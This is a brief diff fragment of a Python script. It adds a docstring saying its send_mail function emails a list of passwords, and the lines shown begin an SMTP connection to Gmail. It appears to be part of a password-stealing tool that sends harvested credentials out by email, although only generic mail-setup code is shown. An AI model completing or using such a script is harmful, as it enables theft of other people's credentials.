@@ -1,6 +1,8 @@
 import subprocess, re, smtplib
 
-
+'''
+send_mail function sends the list of passwords through given email
+'''
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
